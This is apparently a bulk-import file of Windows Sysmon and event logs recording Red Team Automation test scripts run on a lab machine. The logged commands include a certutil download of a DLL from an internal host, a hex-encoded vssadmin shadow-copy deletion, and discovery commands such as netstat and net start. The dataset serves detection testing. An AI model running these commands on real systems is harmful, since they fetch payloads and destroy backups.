{"thread_id":1824,"event_data":{"LogonId":"0xe320","Product":"?","User":"flare-PC\\flare","Hashes":"MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44","Description":"?","Image":"C:\\Program Files (x86)\\Python27\\python.exe","ParentProcessGuid":"{2D3B23BE-4A6D-5BA2-0000-001089CB0C00}","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","FileVersion":"?","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\delete_usnjrnl.py\"","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","Company":"?","ParentProcessId":"3096","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"2876","CommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\delete_usnjrnl.py","TerminalSessionId":"1","IntegrityLevel":"Medium","UtcTime":"2018-09-19 13:09:01.160","ProcessGuid":"{2D3B23BE-4A6D-5BA2-0000-0010EACC0C00}"},"@timestamp":"2018-09-19T13:09:01.160Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:01.160\nProcessGuid: {2D3B23BE-4A6D-5BA2-0000-0010EACC0C00}\nProcessId: 2876\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nFileVersion: ?\nDescription: ?\nProduct: ?\nCompany: ?\nCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\delete_usnjrnl.py\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44\nParentProcessGuid: {2D3B23BE-4A6D-5BA2-0000-001089CB0C00}\nParentProcessId: 3096\nParentImage: C:\\Windows\\SysWOW64\\cmd.exe\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\delete_usnjrnl.py\"","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1191","task":"Process Create (rule: ProcessCreate)","event_id":1,"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"version":5,"host":{"name":"flare-PC"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"uV_z8WUBfVn9xHWioju2"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","Product":"?","UtcTime":"2018-09-19 13:09:06.630","User":"flare-PC\\flare","ParentProcessGuid":"{2D3B23BE-4A72-5BA2-0000-0010AAFA0C00}","Hashes":"MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44","Image":"C:\\Program Files (x86)\\Python27\\python.exe","FileVersion":"?","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\delete_volume_shadows.py\"","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","TerminalSessionId":"1","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","CommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\delete_volume_shadows.py","ParentProcessId":"1588","IntegrityLevel":"Medium","Company":"?","Description":"?","ProcessId":"788","ProcessGuid":"{2D3B23BE-4A72-5BA2-0000-00101BFC0C00}"},"@timestamp":"2018-09-19T13:09:06.630Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:06.630\nProcessGuid: {2D3B23BE-4A72-5BA2-0000-00101BFC0C00}\nProcessId: 788\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nFileVersion: ?\nDescription: ?\nProduct: ?\nCompany: ?\nCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\delete_volume_shadows.py\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44\nParentProcessGuid: {2D3B23BE-4A72-5BA2-0000-0010AAFA0C00}\nParentProcessId: 1588\nParentImage: C:\\Windows\\SysWOW64\\cmd.exe\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\delete_volume_shadows.py\"","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","record_number":"1194","event_id":1,"host":{"name":"flare-PC"},"version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"type":"wineventlog","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"ul_z8WUBfVn9xHWioju3"}}
{"event_data":{"param3":"0x80070005, Zugriff verweigert","param2":"Coordinator","param1":"{e579ab5f-1cc4-44b4-bed9-de0991ff0623}","Binary":"2D20436F64653A2041444D50524F434330303030313731372D2043616C6C3A2041444D50524F434330303030313639322D205049443A202030303030323133362D205449443A202030303030313736302D20434D443A202076737361646D696E2E6578652064656C65746520736861646F7773202F666F723D633A202F6F6C64657374202F71756965742020202020202D20557365723A204E616D653A20666C6172652D50435C666C6172652C205349443A532D312D352D32312D343031393137333930312D333739323736363938362D313435363435313332302D31303031"},"@timestamp":"2018-09-19T13:09:06.000Z","keywords":["Klassisch"],"log_name":"Application","level":"Fehler","computer_name":"flare-PC","source_name":"VSS","message":"Volumenschattenkopie-Dienst-Informationen: Der COM-Server mit CLSID {e579ab5f-1cc4-44b4-bed9-de0991ff0623} und dem Namen \"Coordinator\" kann nicht gestartet werden. [0x80070005, Zugriff verweigert\n] ","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":13,"record_number":"2395","host":{"name":"flare-PC"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"rV_y8WUBfVn9xHWi0Dsk"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-45CD-5BA2-0000-001015F50000}","LogonId":"0xe320","User":"flare-PC\\flare","Hashes":"MD5=C36BB659F08F046B139C8D1B980BF1AC,SHA256=405F03534BE8B45185695F68DEB47D4DAF04DCD6DF9D351CA6831D3721B1EFC4","Description":"Windows-Hostprozess (Rundll32)","UtcTime":"2018-09-19 13:08:13.135","Product":"Betriebssystem Microsoft® Windows®","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","ParentCommandLine":"C:\\Windows\\system32\\svchost.exe -k LocalServiceNoNetwork","ParentImage":"C:\\Windows\\System32\\svchost.exe","TerminalSessionId":"1","CommandLine":"C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\FirewallControlPanel.dll,ShowNotificationDialog /ETOnly 0 /OnProfiles 6 /OtherAllowed 0 /OtherBlocked 0 /OtherEdgeAllowed 0 /NewBlocked 2 \"C:\\program files (x86)\\python27\\python.exe\"","ParentProcessId":"1112","ProcessId":"3648","CurrentDirectory":"C:\\Windows\\system32\\","IntegrityLevel":"Medium","Image":"C:\\Windows\\System32\\rundll32.exe","Company":"Microsoft Corporation","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","ProcessGuid":"{2D3B23BE-4A3D-5BA2-0000-001022FA0B00}"},"@timestamp":"2018-09-19T13:08:13.135Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:08:13.135\nProcessGuid: {2D3B23BE-4A3D-5BA2-0000-001022FA0B00}\nProcessId: 3648\nImage: C:\\Windows\\System32\\rundll32.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows-Hostprozess (Rundll32)\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\FirewallControlPanel.dll,ShowNotificationDialog /ETOnly 0 /OnProfiles 6 /OtherAllowed 0 /OtherBlocked 0 /OtherEdgeAllowed 0 /NewBlocked 2 \"C:\\program files (x86)\\python27\\python.exe\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=C36BB659F08F046B139C8D1B980BF1AC,SHA256=405F03534BE8B45185695F68DEB47D4DAF04DCD6DF9D351CA6831D3721B1EFC4\nParentProcessGuid: {2D3B23BE-45CD-5BA2-0000-001015F50000}\nParentProcessId: 1112\nParentImage: C:\\Windows\\System32\\svchost.exe\nParentCommandLine: C:\\Windows\\system32\\svchost.exe -k LocalServiceNoNetwork","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","event_id":1,"type":"wineventlog","host":{"name":"flare-PC"},"user":{"domain":"NT-AUTORITÄT","identifier":"S-1-5-18","type":"User","name":"SYSTEM"},"version":5,"record_number":"1184","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"rl_y8WUBfVn9xHWi2Dut"}}
{"thread_id":1148,"event_data":{"param2":"Beendet","Binary":"5700650072005300760063002F0031000000","param1":"Windows-Fehlerberichterstattungsdienst"},"@timestamp":"2018-09-19T13:08:16.974Z","keywords":["Klassisch"],"log_name":"System","level":"Informationen","computer_name":"flare-PC","source_name":"Service Control Manager","process_id":488,"provider_guid":"{555908d1-a6d7-4695-8e1e-26931d2012f4}","message":"Dienst \"Windows-Fehlerberichterstattungsdienst\" befindet sich jetzt im Status \"Beendet\".","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":7036,"record_number":"11741","host":{"name":"flare-PC"}}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"sF_z8WUBfVn9xHWiejsJ"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","ParentProcessGuid":"{2D3B23BE-4A1C-5BA2-0000-0010C8100B00}","UtcTime":"2018-09-19 13:08:55.681","Hashes":"MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE","Image":"C:\\Windows\\SysWOW64\\cmd.exe","Description":"Windows-Befehlsprozessor","Product":"Betriebssystem Microsoft® Windows®","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","Company":"Microsoft Corporation","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\delete_catalogs.py\"","ProcessId":"676","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","TerminalSessionId":"1","ParentProcessId":"3756","User":"flare-PC\\flare","IntegrityLevel":"Medium","ProcessGuid":"{2D3B23BE-4A67-5BA2-0000-001005960C00}"},"@timestamp":"2018-09-19T13:08:55.697Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:08:55.681\nProcessGuid: {2D3B23BE-4A67-5BA2-0000-001005960C00}\nProcessId: 676\nImage: C:\\Windows\\SysWOW64\\cmd.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows-Befehlsprozessor\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\delete_catalogs.py\"\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE\nParentProcessGuid: {2D3B23BE-4A1C-5BA2-0000-0010C8100B00}\nParentProcessId: 3756\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\" \"C:\\Users\\flare\\Downloads\\RTA-master\\run_all.py\" ","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","event_id":1,"record_number":"1188","version":5,"type":"wineventlog","user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"host":{"name":"flare-PC"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"sV_z8WUBfVn9xHWiejsM"}}
{"thread_id":1824,"event_data":{"CreationUtcTime":"2018-09-19 13:08:55.181","UtcTime":"2018-09-19 13:08:55.181","Image":"C:\\Windows\\SysWOW64\\certutil.exe","TargetFilename":"C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\mydll.dll","ProcessId":"980","ProcessGuid":"{2D3B23BE-4A67-5BA2-0000-00100F890C00}"},"@timestamp":"2018-09-19T13:08:55.197Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"File created:\nRuleName: \nUtcTime: 2018-09-19 13:08:55.181\nProcessGuid: {2D3B23BE-4A67-5BA2-0000-00100F890C00}\nProcessId: 980\nImage: C:\\Windows\\SysWOW64\\certutil.exe\nTargetFilename: C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\mydll.dll\nCreationUtcTime: 2018-09-19 13:08:55.181","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1187","event_id":11,"version":2,"user":{"name":"SYSTEM","domain":"NT-AUTORITÄT","type":"User","identifier":"S-1-5-18"},"host":{"name":"flare-PC"},"task":"File created (rule: FileCreate)","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"1V_z8WUBfVn9xHWivjtZ"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","ParentProcessGuid":"{2D3B23BE-4A74-5BA2-0000-00107B910D00}","Product":"Betriebssystem Microsoft® Windows®","Hashes":"MD5=32297BB17E6EC700D0FC869F9ACAF561,SHA256=986F524F38B973531002DCEB17414BF8C691B60FB0EA2E4C53C3C7BD3F9EE54E","Image":"C:\\Windows\\SysWOW64\\NETSTAT.EXE","User":"flare-PC\\flare","Description":"TCP/IP-Netstat-Befehl","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\enum_commands.py","Company":"Microsoft Corporation","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"1296","CommandLine":"netstat -nao","IntegrityLevel":"Medium","ParentProcessId":"2304","UtcTime":"2018-09-19 13:09:11.371","TerminalSessionId":"1","ProcessGuid":"{2D3B23BE-4A77-5BA2-0000-00107ED30D00}"},"@timestamp":"2018-09-19T13:09:11.449Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:11.371\nProcessGuid: {2D3B23BE-4A77-5BA2-0000-00107ED30D00}\nProcessId: 1296\nImage: C:\\Windows\\SysWOW64\\NETSTAT.EXE\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: TCP/IP-Netstat-Befehl\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: netstat -nao\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=32297BB17E6EC700D0FC869F9ACAF561,SHA256=986F524F38B973531002DCEB17414BF8C691B60FB0EA2E4C53C3C7BD3F9EE54E\nParentProcessGuid: {2D3B23BE-4A74-5BA2-0000-00107B910D00}\nParentProcessId: 2304\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\enum_commands.py","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","record_number":"1221","type":"wineventlog","version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"host":{"name":"flare-PC"},"event_id":1,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"1l_z8WUBfVn9xHWivjtZ"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","Product":"Microsoft® Windows® Operating System","Hashes":"MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347","Description":"Net Command","Image":"C:\\Windows\\SysWOW64\\net1.exe","UtcTime":"2018-09-19 13:09:11.605","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","ParentImage":"C:\\Windows\\SysWOW64\\net.exe","ParentProcessGuid":"{2D3B23BE-4A77-5BA2-0000-001079D80D00}","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","ParentCommandLine":"net start","ParentProcessId":"3956","ProcessId":"3448","CommandLine":"C:\\Windows\\system32\\net1 start","IntegrityLevel":"Medium","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","Company":"Microsoft Corporation","TerminalSessionId":"1","ProcessGuid":"{2D3B23BE-4A77-5BA2-0000-001094D90D00}"},"@timestamp":"2018-09-19T13:09:11.605Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:09:11.605\nProcessGuid: {2D3B23BE-4A77-5BA2-0000-001094D90D00}\nProcessId: 3448\nImage: C:\\Windows\\SysWOW64\\net1.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Net Command\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\net1 start\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347\nParentProcessGuid: {2D3B23BE-4A77-5BA2-0000-001079D80D00}\nParentProcessId: 3956\nParentImage: C:\\Windows\\SysWOW64\\net.exe\nParentCommandLine: net start","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","event_id":1,"type":"wineventlog","record_number":"1225","user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"version":5,"host":{"name":"flare-PC"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"sl_z8WUBfVn9xHWiejsM"}}
{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4A3C-5BA2-0000-00104AC80B00}","Product":"Betriebssystem Microsoft® Windows®","User":"flare-PC\\flare","Image":"C:\\Windows\\SysWOW64\\certutil.exe","Description":"CertUtil.exe","LogonId":"0xe320","UtcTime":"2018-09-19 13:08:55.087","FileVersion":"6.1.7601.18151 (win7sp1_gdr.130512-1533)","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\certutil_webrequest.py","Company":"Microsoft Corporation","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","ParentProcessId":"3696","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\","TerminalSessionId":"1","CommandLine":"certutil.exe -urlcache -split -f http://172.16.100.10:8000/bin/mydll.dll mydll.dll","IntegrityLevel":"Medium","ProcessId":"980","Hashes":"MD5=0D52559AEF4AA5EAC82F530617032283,SHA256=48850FB7229D99E48C3A749556684E962587058D612C659C58F8B8DB2D00ABEE","ProcessGuid":"{2D3B23BE-4A67-5BA2-0000-00100F890C00}"},"@timestamp":"2018-09-19T13:08:55.087Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:08:55.087\nProcessGuid: {2D3B23BE-4A67-5BA2-0000-00100F890C00}\nProcessId: 980\nImage: C:\\Windows\\SysWOW64\\certutil.exe\nFileVersion: 6.1.7601.18151 (win7sp1_gdr.130512-1533)\nDescription: CertUtil.exe\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: certutil.exe -urlcache -split -f http://172.16.100.10:8000/bin/mydll.dll mydll.dll\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=0D52559AEF4AA5EAC82F530617032283,SHA256=48850FB7229D99E48C3A749556684E962587058D612C659C58F8B8DB2D00ABEE\nParentProcessGuid: {2D3B23BE-4A3C-5BA2-0000-00104AC80B00}\nParentProcessId: 3696\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\certutil_webrequest.py","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":1,"record_number":"1186","version":5,"user":{"domain":"NT-AUTORITÄT","identifier":"S-1-5-18","type":"User","name":"SYSTEM"},"task":"Process Create (rule: ProcessCreate)","host":{"name":"flare-PC"},"opcode":"Info"}
